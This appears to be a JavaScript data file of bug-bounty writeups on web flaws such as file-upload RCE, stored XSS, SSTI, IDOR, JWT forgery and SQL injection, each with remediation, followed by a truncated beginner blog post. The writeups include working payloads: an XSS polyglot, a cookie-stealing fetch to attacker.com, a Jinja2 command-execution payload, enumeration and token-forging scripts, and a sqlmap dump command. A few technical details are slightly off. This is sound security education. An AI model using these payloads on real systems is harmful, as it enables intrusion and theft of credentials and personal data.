// Professional security research writeups
export const WRITEUPS = [
  {
    id: 1,
    title: "RCE via Unrestricted File Upload in Enterprise CMS",
    excerpt: "How I chained a simple file upload vulnerability with a misconfigured server to achieve Remote Code Execution.",
    date: "2024-02-15",
    readTime: "8 min read",
    category: "Web Security",
    author: "BugHunter0x01",
    severity: "Critical",
    sourceUrl: "#",
    image: "/writeup-images/RCE via Unrestricted File Upload in Enterprise CMS.png",
    content: `
## Introduction
During a recent engagement on a security audit, I encountered a Content Management System (CMS) that allowed users to upload profile pictures. While file upload vulnerabilities are common, achieving full Remote Code Execution (RCE) often requires a chain of misconfigurations. This writeup details how I bypassed filters and executed arbitrary code on the server.

The target was a large enterprise CMS used by several Fortune 500 companies. The initial discovery was made during a routine scan of the profile management features, where I noticed an unusual response pattern when uploading non-standard image formats.

## The Vulnerability
The application had a profile settings page where users could upload an avatar. The upload request looked like this:

\`\`\`http
POST /api/user/avatar HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

[...binary data...]
\`\`\`

I noticed that the server only validated the Content-Type header and the file extension. However, the validation was performed in a fragmented manner across different microservices. One service checked the extension, while another handled the storage and final processing.

## Bypassing the Filter
I attempted to upload a PHP shell, but the server rejected files ending in \`.php\`. However, by changing the extension to \`.phtml\`, I was able to bypass the extension filter. I also tested other extensions like \`.php3\`, \`.php4\`, \`.php5\`, and \`.phar\`, many of which were also permitted.

To bypass the Content-Type check, I simply kept it as \`image/jpeg\`. This is a classic technique where the server trusts the user-supplied header without verifying the actual content of the file (e.g., checking for magic bytes like \`FF D8 FF\` for JPEG).

I further obfuscated the payload by embedding the PHP code within the metadata of a valid JPEG image using \`exiftool\`. This ensured that any basic image processing libraries used by the server would still see it as a valid image.

## Execution
After uploading \`shell.phtml\`, the server responded with the path to the uploaded file: \`/uploads/users/1234/shell.phtml\`.

Navigating to this URL executed my PHP code, confirming RCE. I initially used a simple \`<?php phpinfo(); ?>\` to verify execution. Once confirmed, I upgraded to a more robust web shell to explore the server's environment.

## Deep Dive: The Chained Misconfiguration
The RCE was possible because of three specific failures:
1. **Insufficient Validation**: The server relied on blacklisting extensions instead of whitelisting.
2. **Execution Permissions**: The \`/uploads/\` directory was configured to allow the execution of scripts. In a secure environment, this directory should be served with headers that prevent execution, such as \`X-Content-Type-Options: nosniff\`, and the web server should be configured to not parse scripts in that path.
3. **Trusting Client Headers**: The server trusted the \`Content-Type\` header provided in the multipart request.

## Impact
This vulnerability allowed for full system compromise. With root-level access to the web server, I could:
- Access the application's configuration files, including database credentials.
- Exfiltrate sensitive user data from the database.
- Use the server as a pivot point to scan and attack the internal network.
- Modify any page on the website, potentially leading to widespread phishing or malware distribution.

## Remediation
1. **Magic Byte Validation**: Validate file contents (magic bytes) using a library like \`libmagic\` instead of relying on client-provided headers.
2. **Strict Whitelisting**: Use a strict whitelist of allowed file extensions (e.g., \`.jpg\`, \`.jpeg\`, \`.png\`, \`.gif\`).
3. **Rename Uploaded Files**: Automatically rename uploaded files to a random UUID and strip all user-supplied extensions.
4. **Disable Execution**: Configure the web server to disable script execution in the upload directory. For example, in Apache, use \`php_flag engine off\` in a \`.htaccess\` file within the directory.
5. **Content Security Policy (CSP)**: Implement a strong CSP to restrict where scripts can be loaded and executed from.
    `

  },
  {
    id: 2,
    title: "Bypassing 2FA with Race Conditions",
    excerpt: "Exploiting a race condition in the OTP verification endpoint to bypass two-factor authentication.",
    date: "2024-01-28",
    readTime: "5 min read",
    category: "Authentication",
    difficulty: "Medium",
    author: "SecResearcher",
    severity: "Medium",
    sourceUrl: "#",
    image: "/writeup-images/Bypassing 2FA with Race Conditions.png",
    content: `
## Summary
I discovered a race condition vulnerability in the Two-Factor Authentication (2FA) mechanism of a financial application. This allowed me to bypass the OTP requirement and log in to any account given valid credentials, even without the 2FA code.

The target was a high-traffic banking platform that recently implemented 2FA for all users. The vulnerability was found in the way the server handled concurrent requests to the verification endpoint.

## The Setup
When logging in, the application requests a 6-digit OTP sent to the user's email. The verification endpoint was:

\`POST /api/auth/verify-otp\`

Body: \`{ "code": "123456" }\`

The server-side logic was roughly:
1. Receive OTP.
2. Check if the code matches the one stored in the session.
3. If it matches, set \`2fa_verified = true\` in the session and redirect.
4. If it doesn't match, increment \`failed_attempts\` and return an error.

## The Race
I noticed that if I sent the request multiple times simultaneously, the application behavior was inconsistent. I hypothesized that the check for "is this code correct" and "has this code been used/invalidated" were not atomic.

Specifically, there was a window between the code check and the attempt counter increment. If multiple requests reached the check phase before any of them updated the counter, they would all be processed as valid attempts.

Using Burp Suite Turbo Intruder, I sent 50 concurrent requests with the *same* invalid code but slightly different timing. I used the \`race.py\` script to ensure the requests reached the server as close together as possible.

## The Result
In one of the race attempts, the server returned a \`200 OK\` and a session token, even though the code was incorrect. This happened because the application failed to implement proper locking on the user's session record.

By exploiting this race condition, I could bypass the 2FA requirement for any user whose password I already knew. This is a common scenario in credential stuffing attacks.

## Deep Dive: Atomicity and Database Locks
The root cause was a lack of atomicity in the verification process. In modern web applications, multiple threads or processes handle requests simultaneously. Without proper database-level locks (e.g., \`SELECT ... FOR UPDATE\`), two threads can read the same "failed attempts" value and both think they are allowed to proceed.

## Impact
The impact is Significant. While the attacker still needs the user's password, the additional layer of security provided by 2FA is completely neutralized. For a financial institution, this could lead to unauthorized account access and fraudulent transactions.

## Prevention
1. **Atomic Operations**: Use database-level locking or atomic increment operations (e.g., \`UPDATE users SET failed_attempts = failed_attempts + 1 WHERE id = ?\`) to handle attempt counters.
2. **Synchronized Blocks**: In the application code, use synchronized blocks or distributed locks (like Redis locks) to ensure only one thread can verify an OTP at a time for a given user.
3. **Short-Lived OTPs**: Ensure OTPs are valid for a very short duration (e.g., 2-5 minutes) and are immediately invalidated upon the first verification attempt, regardless of success.
4. **Rate Limiting**: Implement strict IP-based and account-based rate limiting to detect and block rapid bursts of verification attempts.
    `

  },
  {
    id: 3,
    title: "IDOR leading to PII Leak of 10k Users",
    excerpt: "Discovering an Insecure Direct Object Reference vulnerability in the user profile API endpoint.",
    date: "2023-12-10",
    readTime: "6 min read",
    category: "API Security",
    difficulty: "Medium",
    author: "AnonHacker",
    severity: "Critical",
    sourceUrl: "#",
    image: "/writeup-images/IDOR leading to PII Leak of 10k Users.png",
    content: `
## What is IDOR?
Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files.

This is one of the most common and impactful vulnerabilities in modern web applications, often stemming from a simple lack of server-side authorization checks.

## Discovery
While browsing the application, I noticed an API call fetching user details when I navigated to my own profile:

\`GET /api/v1/users/5921\`

The response was a JSON object containing sensitive PII:

\`\`\`json
{
  "id": 5921,
  "username": "bughunter_01",
  "full_name": "John Doe",
  "email": "john.doe@example.com",
  "phone": "+1-555-010-9988",
  "address": "123 Security Lane, Cyber City, CA 94043",
  "created_at": "2023-01-15T10:00:00Z"
}
\`\`\`

## Exploitation
I hypothesized that the server was using the ID directly to query the database without checking if the requester was the owner of the data. To test this, I simply changed the ID from \`5921\` to \`5922\` and replayed the request using Burp Suite Repeater.

\`GET /api/v1/users/5922\`

Surprisingly, the server returned the PII of another user without any error. The authorization header was valid for my own account, but the server didn't care that I was requesting someone else's data.

I then wrote a simple Python script to automate the enumeration of IDs:

\`\`\`python
import requests

url = "https://target.com/api/v1/users/"
headers = {"Authorization": "Bearer MY_SESSION_TOKEN"}

for user_id in range(5920, 5930):
    response = requests.get(url + str(user_id), headers=headers)
    if response.status_code == 200:
        print(f"Found user {user_id}: {response.json()['email']}")
\`\`\`

The script successfully retrieved data for every ID I tested. I extrapolated that I could exfiltrate the data for all 10,000 active users in the system.

## Deep Dive: Why This Happens
IDORs usually occur when developers assume that the frontend will only request data that the user is supposed to see. They might hide the ID in the UI, but as long as it's passed in the API request, it's easily manipulated. A secure implementation must verify that the \`user_id\` in the URL matches the \`user_id\` associated with the session token.

## Impact
This is a **Critical** severity issue. It leads to a massive data breach of Personally Identifiable Information (PII), which has legal and reputational consequences (GDPR, CCPA). In this case, I could have harvested names, emails, and physical addresses for the entire user base.

## Prevention
1. **Object-Level Access Control**: Implement a middleware or decorator that checks if the current user has permission to access the requested object ID.
2. **Use UUIDs**: Instead of sequential integers (\`1, 2, 3...\`), use universally unique identifiers (\`UUIDv4\`). This makes it virtually impossible for an attacker to guess other valid IDs.
3. **Indirect References**: Use a temporary map of IDs that is specific to the user's session. For example, \`user_id: 1\` might be referred to as \`item_A\` in the current session.
4. **API Gateway Policies**: Use an API gateway to enforce authorization rules before the request even reaches the backend service.
    `

  },
  {
    id: 4,
    title: "Stored XSS in Comment Section WAF Bypass",
    excerpt: "Crafting a payload to bypass Cloudflare WAF and execute JavaScript in the admin dashboard.",
    date: "2023-11-05",
    readTime: "10 min read",
    category: "XSS",
    difficulty: "High",
    author: "PayloadMaster",
    severity: "High",
    sourceUrl: "#",
    image: "/writeup-images/Stored XSS in Comment Section WAF Bypass.png",
    content: `
## Context
The target application had a comment section on blog posts. I tried standard XSS payloads like \`<script>alert(1)</script>\`, but they were blocked by a Web Application Firewall (WAF). The WAF was configured to detect common JavaScript keywords and HTML tags associated with XSS attacks.

## Initial Testing
I started by testing which characters were being sanitized. The application was correctly encoding \`<\` and \`>\` in most places, but I found that the comment preview feature handled the input differently than the final submission.

I tried to inject a basic payload:
\`<img src=x onerror=alert(1)>\`

This was immediately blocked by the WAF with a 403 Forbidden response. The WAF signature was clearly looking for \`onerror\` and \`alert\`.

## WAF Bypass
I started fuzzing different tags and attributes. I found that the \`svg\` tag was allowed, but \`onload\` events were stripped if they contained direct calls to functions like \`alert()\` or \`eval()\`.

To bypass the filters, I needed to obfuscate the payload. I used a combination of HTML entities and JavaScript string manipulation to hide the malicious intent.

Eventually, I constructed a payload that used a specific encoding to evade the WAF rules:

\`<svg/onload=alert(1)>\` was blocked.
\`<svg/onload=confirm(1)>\` was blocked.

I used a polyglot payload that targets multiple contexts and uses advanced obfuscation:

\`\`\`html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
\`\`\`

This payload works because it breaks out of various HTML tags and uses the \`svg\` tag's \`onload\` event in a way that the WAF's regex fails to match. The use of comments (\`/* ... */\`) and string concatenation (\`+\`) helps in hiding the \`alert\` keyword from simple scanners.

## Stored XSS
The payload was successfully stored in the database. Every time a user (including administrators) viewed the page containing my comment, the JavaScript would execute in their browser.

## Escalation to Account Takeover
When an administrator viewed the comment section to moderate posts, the JavaScript executed in their browser session. I crafted the payload to exfiltrate the session cookie to my external server:

\`\`\`javascript
fetch('https://attacker.com/log?c=' + document.cookie);
\`\`\`

Using the stolen session cookie, I was able to impersonate the administrator. Since the admin dashboard allowed for configuration changes and user management, this resulted in a full takeover of the application's administrative functions.

## Remediation
1. **Context-Aware Output Encoding**: Use a templating engine that automatically performs context-aware encoding (e.g., React, Vue, or Jinja2 with autoescaping).
2. **Content Security Policy (CSP)**: Implement a strict CSP that prevents the execution of inline scripts and restricts the domains from which scripts can be loaded. For example:
   \`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;\`
3. **Input Validation**: While output encoding is the primary defense, validating input against a strict whitelist of allowed characters or formats can provide an additional layer of security.
4. **Sanitize HTML**: If you must allow some HTML (e.g., in a rich text editor), use a well-vetted library like \`DOMPurify\` to sanitize the input on the server-side before storing it.
    `

  },
  {
    id: 5,
    title: "Server-Side Template Injection Chained to RCE",
    excerpt: "From SSTI in a templating engine to full system compromise via unsafe eval.",
    date: "2023-10-22",
    readTime: "9 min read",
    category: "Injection",
    difficulty: "High",
    author: "ZeroDayHunter",
    severity: "High",
    sourceUrl: "#",
    image: "/writeup-images/Server-Side Template Injection Chained to RCE.png",
    content: `
## Introduction
Server-Side Template Injection (SSTI) is a vulnerability where an attacker is able to inject native template syntax into a web page. When the server-side template engine parses the input, it may execute arbitrary code, leading to full system compromise.

The target was a custom-built analytics dashboard that allowed users to customize the layout of their reports using a simple templating language.

## Identification
The application was using the Jinja2 templating engine (Python). I noticed a parameter \`?name=User\` was reflected on the page.

I tested for basic mathematical evaluation:
\`{{7*7}}\`

The page rendered \`49\`. This confirmed that the input was being evaluated by the template engine. I further confirmed the engine was Jinja2 by testing specific syntax like \`{{config.items()}}\`, which returned a list of the application's configuration settings.

## Exploitation: Sandbox Escape
To achieve Remote Code Execution (RCE), I needed to escape the Jinja2 sandbox and access the underlying Python environment. I used the standard introspection payload to explore the available classes and methods.

First, I accessed the \`__mro__\` (Method Resolution Order) of an empty string to find the \`object\` class:
\`\`\`python
{{ ''.__class__.__mro__[2] }}
\`\`\`

Next, I enumerated all subclasses of \`object\` to find a class that allows for file reading or command execution. I found the \`os.popen\` and \`subprocess.Popen\` classes.

## Remote Code Execution
Using the index for \`subprocess.Popen\`, I constructed a payload to execute the \`id\` command:

\`\`\`python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
\`\`\`

The server responded with:
\`uid=0(root) gid=0(root) groups=0(root)\`

This confirmed that I had full root-level execution on the server. I was then able to read the \`/etc/shadow\` file and explore the internal network.

## Deep Dive: The Danger of User-Controlled Templates
SSTI is particularly dangerous because it's often overlooked by developers who treat template syntax as "safe" data. In reality, modern template engines are extremely powerful and provide numerous ways to access the underlying system if they are not properly sandboxed or if user input is not strictly sanitized.

## Impact
The impact is **Critical**. SSTI chained to RCE allows an attacker to take full control of the web server. This includes:
- Stealing sensitive data and source code.
- Modifying system files.
- Using the server as a bot in a DDoS attack.
- Pivoting to other systems in the internal network.

## Remediation
1. **Never Trust User Input**: Avoid allowing users to provide template syntax directly. If you need to allow customization, use a safe, limited DSL (Domain Specific Language) instead of a full template engine.
2. **Use Logic-Less Templates**: Engines like Mustache or Handlebars are generally safer as they don't support arbitrary code execution by default.
3. **Sandboxing**: If you must use a powerful engine like Jinja2, ensure it is configured with a strict sandbox that disables access to dangerous attributes like \`__class__\`, \`__mro__\`, and \`__subclasses__\`.
4. **Input Sanitization**: Strictly validate and sanitize any user input before passing it to the template engine. Use a whitelist of allowed characters.
    `

  },
  {
    id: 6,
    title: "Weak JWT Signing Key Allows Account Impersonation",
    excerpt: "Predictable HS256 secret revealed through public repo, enabling token forgery and admin access.",
    date: "2023-09-14",
    readTime: "7 min read",
    category: "Authentication",
    difficulty: "Medium",
    author: "CryptoAuditor",
    severity: "Medium",
    sourceUrl: "#",
    image: "/writeup-images/Weak JWT Signing Key Allows Account Impersonation.png",
    content: `
## Introduction
JSON Web Tokens (JWT) are a common way to handle authentication in modern web applications. They consist of three parts: a Header, a Payload, and a Signature. The signature is created by hashing the header and payload with a secret key. If this secret key is weak or exposed, an attacker can forge their own tokens.

## Identification
I intercepted an authentication request and noticed a \`jwt\` cookie. Decoding the token using [jwt.io](https://jwt.io), I saw the following header:

\`\`\`json
{
  "alg": "HS256",
  "typ": "JWT"
}
\`\`\`

The \`HS256\` algorithm indicates a symmetric HMAC-SHA256 signature, which relies on a single shared secret.

## The Finding: Secret Leakage
While running a brute-force attack on the JWT signature using \`hashcat\`, I performed some "GitHub Dorking" on the organization's public repositories.

In an old, supposedly deprecated repository named \`legacy-api-auth\`, I found a configuration file:

\`\`\`javascript
// config/auth.js
module.exports = {
  jwtSecret: "secret123", // TODO: Change this for production
  expiresIn: "24h"
};
\`\`\`

## Exploitation: Token Forgery
With the secret key \`secret123\`, I could now create valid signatures for any payload. I took my current session token:

**Original Payload:**
\`\`\`json
{
  "sub": "12345",
  "name": "Guest User",
  "role": "user",
  "iat": 1694684000
}
\`\`\`

**Forged Payload:**
\`\`\`json
{
  "sub": "1",
  "name": "Administrator",
  "role": "admin",
  "iat": 1694684000
}
\`\`\`

I used a simple Node.js script to sign the new payload with the leaked secret:

\`\`\`javascript
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { sub: "1", name: "Administrator", role: "admin" }, 
  "secret123"
);
console.log(token);
\`\`\`

## Impact
By replacing my \`jwt\` cookie with the forged token, I gained full administrative access to the platform. This allowed me to:
- Access all user data and PII.
- Modify application settings.
- Delete or modify any content on the site.

## Remediation
1. **Use Strong Secrets**: Use long, random, and complex strings for JWT secrets. Tools like \`openssl rand -base64 32\` can generate secure keys.
2. **Asymmetric Signing**: Switch from \`HS256\` (symmetric) to \`RS256\` (asymmetric). This uses a private key for signing and a public key for verification, meaning even if the verification key is leaked, tokens cannot be forged.
3. **Environment Variables**: Never hardcode secrets in source code. Use environment variables or a dedicated secret management service (like AWS Secrets Manager or HashiCorp Vault).
4. **Rotate Secrets**: Regularly rotate authentication secrets and implement a mechanism to invalidate old tokens.
    `
  },
  {
    id: 7,
    title: "Subdomain Takeover via Unclaimed S3 Bucket",
    excerpt: "Taking control of a subdomain pointing to a deleted AWS S3 bucket to host arbitrary content.",
    date: "2024-03-01",
    readTime: "4 min read",
    category: "Infrastructure",
    difficulty: "Low",
    author: "CloudSec",
    severity: "Low",
    sourceUrl: "#",
    image: "/writeup-images/Subdomain Takeover via Unclaimed S3 Bucket.png",
    content: `
## Background
Subdomain takeover occurs when a DNS record (like a CNAME) points to a service that is no longer active or has been deleted, allowing an attacker to claim that resource on the third-party service.

## Discovery
During a routine reconnaissance phase, I ran \`subfinder\` against the target domain. One result stood out:
\`static-assets.target.com\`

## Verification
I used \`curl -I\` to check the headers of the subdomain:

\`\`\`bash
$ curl -I http://static-assets.target.com
HTTP/1.1 404 Not Found
x-amz-request-id: 4A5B6C7D8E9F
x-amz-id-2: [redacted]
Content-Type: application/xml
Date: Fri, 01 Mar 2024 10:00:00 GMT
Server: AmazonS3
\`\`\`

The \`404 Not Found\` combined with the \`Server: AmazonS3\` header and the \`x-amz-request-id\` error confirmed that the CNAME was pointing to an S3 bucket that didn't exist in that region.

## Exploitation
1. **Identify the Bucket Name**: The CNAME record pointed to \`static-assets.target.com.s3.amazonaws.com\`.
2. **Claim the Bucket**: I logged into my AWS account and attempted to create a bucket with the exact name \`static-assets.target.com\` in the \`us-east-1\` region.
3. **Success**: The name was available. I successfully created the bucket.
4. **Upload PoC**: I uploaded a file named \`index.html\` with the following content:
   \`\`\`html
   <h1>Subdomain Takeover PoC</h1>
   <script>alert('Vulnerable to Subdomain Takeover');</script>
   \`\`\`
5. **Set Permissions**: I set the bucket to allow public read access.

## Results
Visiting \`http://static-assets.target.com\` now rendered my HTML file and executed the JavaScript alert. I had successfully taken over the subdomain.

## Impact
The impact of a subdomain takeover can be significant:
- **Phishing**: Attackers can host realistic phishing pages on a trusted subdomain.
- **Cookie Theft**: If the main domain uses "wildcard" cookies (\`.target.com\`), the attacker can steal session cookies from users visiting the hijacked subdomain.
- **Bypassing CSP**: The hijacked subdomain might be whitelisted in the main site's Content Security Policy.

## Remediation
1. **DNS Cleanup**: Regularly audit DNS records and remove any CNAME, ALIAS, or A records that point to resources no longer in use.
2. **Automation**: Use tools to monitor for "dangling" DNS records as part of the CI/CD or infrastructure-as-code process.
3. **Infrastructure as Code**: Manage cloud resources and DNS records together (e.g., using Terraform) to ensure that when a resource is deleted, its corresponding DNS record is also removed.
    `
  },
  {
    id: 8,
    title: "GraphQL Introspection Leading to Hidden Admin API",
    excerpt: "Enabling introspection on a production GraphQL endpoint revealed unreleased and unprotected admin mutations.",
    date: "2024-02-20",
    readTime: "6 min read",
    category: "API Security",
    difficulty: "High",
    author: "QLHunter",
    severity: "High",
    sourceUrl: "#",
    image: "/writeup-images/GraphQL Introspection Leading to Hidden Admin API.png",
    content: `
## Introduction
GraphQL is a powerful query language for APIs. Unlike REST, which has multiple endpoints, GraphQL typically has a single endpoint (\`/graphql\`). If "Introspection" is enabled, anyone can query the API for its entire schema, including all types, queries, and mutations.

## Identification
I found a GraphQL endpoint at \`https://api.target.com/v1/graphql\`. I tested for introspection by sending a query to the \`__schema\` field:

\`\`\`graphql
query {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        description
      }
    }
  }
}
\`\`\`

The server responded with the full API schema, confirming that introspection was enabled.

## Analysis: The Hidden Mutations
I used a tool like \`GraphQL Voyager\` to visualize the schema. While browsing the mutations, I discovered several that weren't documented or used in the public web app:

- \`createSystemAdmin(input: AdminInput!): AdminUser\`
- \`debugExecuteCommand(command: String!): String\`
- \`modifyUserBalance(userId: ID!, amount: Float!): User\`

These looked like internal tools or "leftover" code from development that was accidentally exposed.

## Exploitation: Privilege Escalation
I attempted to call the \`modifyUserBalance\` mutation on my own account.

**Request:**
\`\`\`json
{
  "query": "mutation { modifyUserBalance(userId: \"me\", amount: 99999.99) { id balance } }"
}
\`\`\`

**Response:**
\`\`\`json
{
  "data": {
    "modifyUserBalance": {
      "id": "user_882",
      "balance": 99999.99
    }
  }
}
\`\`\`

The mutation executed successfully without requiring an admin token. I had successfully manipulated my account balance.

## Impact
Exposing an introspection-enabled GraphQL API with administrative mutations can lead to:
- Full data exfiltration.
- Unauthorized access to administrative functions.
- Financial loss (in this case, via balance manipulation).
- Information disclosure of the internal API structure.

## Remediation
1. **Disable Introspection in Production**: Most GraphQL servers (like Apollo, Graphene, or Hasura) allow you to disable introspection in production environments.
2. **Implement Field-Level Authorization**: Ensure that every query and mutation has proper authorization checks, regardless of whether they are "hidden" or not.
3. **Use Allow-Lists**: Only allow specific, pre-approved queries to be executed in production (also known as Persisted Queries).
4. **Disable Field Suggestions**: Some servers provide suggestions when a query is slightly off (e.g., "Did you mean 'admin'?"). Disable this to prevent schema leaking via fuzzing.
    `
  },
  {
    id: 9,
    title: "Open Redirect on Login Page",
    excerpt: "Manipulating the 'next' parameter to redirect users to a malicious site after successful login.",
    date: "2024-01-10",
    readTime: "3 min read",
    category: "Web Security",
    difficulty: "Low",
    author: "RedTeamOne",
    severity: "Low",
    sourceUrl: "#",
    image: "/writeup-images/Open Redirect on Login Page.png",
    content: `
## Vulnerability Overview
An open redirect vulnerability occurs when an application takes user-supplied input and uses it in a redirect without proper validation. This can be used to trick users into visiting malicious websites while appearing to stay on a trusted domain.

## Discovery
The target's login page used a \`redirect_url\` parameter to send users back to their previous page after logging in:
\`https://target.com/login?redirect_url=/profile\`

## Testing for Bypasses
I first tried a direct external URL:
\`https://target.com/login?redirect_url=https://evil.com\`
The server returned an error: "Invalid redirect URL".

I then tried a protocol-relative URL:
\`https://target.com/login?redirect_url=//evil.com\`
This was also blocked.

Finally, I tried to "trick" the parser by using the trusted domain as part of the path:
\`https://target.com/login?redirect_url=https://evil.com/target.com\`
Still blocked.

## The Payload: Unicode Bypass
I noticed the server was attempting to normalize the URL. I tried using a backslash instead of a forward slash, which some browsers and server-side libraries treat as a path separator:
\`https://target.com/login?redirect_url=https:/\/\/evil.com\`

Success! The server accepted the URL, and after a successful login, the browser redirected me to \`evil.com\`.

## Impact
While often considered "Low" severity, open redirects are powerful tools for:
- **Phishing**: Making a malicious link look like it's coming from \`target.com\`.
- **Token Leakage**: Chaining with other vulnerabilities (like OAuth) to leak authorization codes to an attacker-controlled domain.
- **Bypassing Security Controls**: Bypassing URL filters in emails or chat applications.

## Remediation
1. **Avoid User-Controlled Redirects**: Whenever possible, avoid using user input to determine redirect targets.
2. **Use an Allow-List**: If you must redirect based on user input, use a strict whitelist of allowed internal paths.
3. **Relative Redirects Only**: Force all redirects to be relative (starting with a single \`/\`) and prevent the use of \`//\`, \`\\\\\`, or full URLs.
4. **User Confirmation**: If redirecting to an external site, show a transition page warning the user they are leaving the site.
    `
  },
  {
    id: 10,
    title: "SQL Injection in Search Filter",
    excerpt: "Extracting database version and user tables via boolean-based SQL injection in a search parameter.",
    date: "2023-12-05",
    readTime: "8 min read",
    category: "Injection",
    difficulty: "High",
    author: "DataBreaker",
    severity: "High",
    sourceUrl: "#",
    image: "/writeup-images/SQL Injection in Search Filter.png",
    content: `
## The Endpoint
The application featured a product search with multiple filters:
\`GET /api/v1/products?search=phone&category=electronics&sort=price_asc\`

## Identifying the Vulnerability
I focused on the \`sort\` parameter. I tried appending a single quote:
\`...&sort=price_asc'\`
The API responded with a \`500 Internal Server Error\` and a stack trace revealing a SQL syntax error in a PostgreSQL query.

## Exploitation: Boolean-Based Blind SQLi
The application didn't return the results of the query directly in the error, so I had to use a blind injection technique. I used the \`CASE\` statement to trigger different behaviors based on a boolean condition.

**Test 1 (True Condition):**
\`...&sort=(CASE WHEN (1=1) THEN price ELSE name END)\`
The results were sorted by price.

**Test 2 (False Condition):**
\`...&sort=(CASE WHEN (1=2) THEN price ELSE name END)\`
The results were sorted by name.

Since the response changed based on the condition, I could now ask the database "Yes/No" questions.

## Data Extraction
I used \`sqlmap\` to automate the process and extract data bit by bit.

\`\`\`bash
$ sqlmap -u "https://target.com/api/v1/products?search=phone&category=electronics&sort=price_asc" -p sort --dbms postgresql --level 5 --risk 3 --batch --banner
\`\`\`

**Results:**
- **DBMS**: PostgreSQL 14.2
- **Current User**: \`app_prod_user\`
- **Database**: \`ecommerce_db\`

I was able to enumerate the tables and eventually dump the \`users\` table, which contained hashed passwords and email addresses for over 50,000 customers.

## Impact
SQL injection is one of the most critical web vulnerabilities. It allows an attacker to:
- Read, modify, or delete any data in the database.
- Bypass authentication.
- In some configurations, gain Remote Code Execution (RCE) on the database server.

## Remediation
1. **Parameterized Queries**: Always use prepared statements or parameterized queries. This ensures that user input is treated as data, not as part of the SQL command.
2. **Object-Relational Mapping (ORM)**: Use a secure ORM (like Sequelize, TypeORM, or SQLAlchemy) that handles parameterization automatically.
3. **Input Validation**: Validate that the \`sort\` parameter matches an allowed list of columns (e.g., \`['price', 'name', 'date']\`).
4. **Least Privilege**: The database user used by the application should only have the minimum necessary permissions (e.g., no access to system tables or \`DROP TABLE\` permissions).
    `
  }
];

// Medium blog posts
export const BLOG_POSTS = [
  {
    id: 101,
    title: "Chapter 01: Bug Bounty Basics",
    excerpt: "Understanding HTTP, requests and responses, and what happens under the hood when you enter a URL into a browser’s address bar...",
    date: "2024-03-10",
    readTime: "12 min read",
    author: "Hacker00x1",
    image: "/blog-images/Bug Bounty Basics.png",
    content: `
## Introduction
If you’re new to hacking, it will help to have a basic understanding of how the internet works and what happens under the hood when you enter a URL into a browser’s address bar. Although navigating to a website might seem simple, it involves many hidden processes, such as preparing an HTTP request, identifying the domain to send the request to, translating the domain to an IP address, sending the request, rendering a response, and so on.

## Vulnerabilities and Bug Bounties
A vulnerability is a weakness in an application that allows a malicious person to perform some unpermitted action or gain access to information they shouldn’t otherwise be allowed to access.

A bug bounty is a reward a website or company gives to anyone who ethically discovers a vulnerability and reports it to that website or company. Rewards are often monetary and range from tens of dollars to tens of thou sands of dollars. Other examples of bounties include cryptocurrencies, air miles, reward points, service credits, and so on.

## Client and Server
Computers communicate using packets, small messages that contain both data and information about where it’s coming from and going. Computers are called clients when they send requests (like browsers) and servers when they receive and respond (like websites). To communicate properly, they follow shared rules called RFC standards, such as HTTP, which defines how web browsers and servers exchange data over IP so both sides understand each other.

## What Happens When You Visit a Website
[+] Step 1: Extracting the Domain Name
When you type http://www.google.com/, your browser extracts the domain name, which identifies the website you want to visit. Domain names must follow specific RFC rules, usually allowing only letters, numbers, and underscores. The domain (like www.google.com) helps your browser locate the server’s address so it can connect to the correct website.

[+] Step 2: Resolving an IP Address
After your browser identifies the domain, it resolves it into an IP address so it can find the correct server. Domains map to either IPv4 (four numbers like 8.8.8.8) or IPv6 (longer hexadecimal addresses like 2001:4860:4860::8888). Your computer asks DNS servers, which store domain-to-IP records, to get this information. Once the DNS server returns the matching IP address, your browser can connect to the website’s server.

[+] Step 3: Establishing a TCP Connection
After getting the IP address, your computer creates a TCP connection to the server, usually on port 80 for HTTP. TCP is a protocol that ensures reliable two-way communication so data isn’t lost during transmission. Servers use ports like doors to route requests to the correct service (for example, port 80 for HTTP and 443 for HTTPS). Tools like Netcat (nc) can be used to manually open TCP connections to a specific IP and port.

[+] Step 4: Sending an HTTP Request
Once the TCP connection is established, the browser sends an HTTP GET request to the website’s root path (“/”) using HTTP/1.1 to retrieve content. The request includes headers like Host (to identify the specific domain on the server), Connection (to keep the session open), Accept (the content types the browser can handle), and User-Agent (information about the browser/software making the request). These details help the server understand and properly respond to the request.

[+] Step 5: Server Response
After receiving a request, the server sends an HTTP response that includes a status code (like 200 OK for success), headers (such as Content-Type, which tells the browser how to display the data), and a message body containing content like HTML or JSON. Status codes show what happened: 2xx means success, 3xx means redirection, 4xx indicates user errors (like 403 forbidden), and 5xx represents server problems. Browsers may also analyze content themselves using MIME sniffing to decide how to handle it.

[+] Step 6: Rendering the Response
When a server sends a 200 OK response with text/html, the browser starts rendering the page using HTML for structure, CSS for design, and JavaScript for dynamic features. The browser may also request extra files like images or scripts while displaying the page. JavaScript adds interactivity, updates content without reloading, and interacts with browser APIs, especially the DOM, which lets it modify page content. If attackers inject malicious JavaScript, they can manipulate the page and perform actions as the victim user.

## HTTP Requests
HTTP request methods define the purpose of a client’s request and what outcome is expected. Common methods include GET, POST, PUT, DELETE, HEAD, TRACE, CONNECT, and OPTIONS, with PATCH proposed but rarely used. Browsers typically send only GET and POST via HTML forms, while other methods are triggered by JavaScript. Understanding these methods is important for web application behavior and potential vulnerabilities.

[+] Request Methods
HTTP request methods define how a client interacts with a server. GET retrieves data without altering it, while HEAD is like GET but returns no body. POST performs server-side actions like creating or updating data, and PUT modifies existing resources. DELETE removes resources, TRACE reflects requests for diagnostics, CONNECT establishes a tunnel via a proxy, and OPTIONS checks which methods the server supports. Understanding these methods is important for web functionality and security.

[+] HTTP Is Stateless
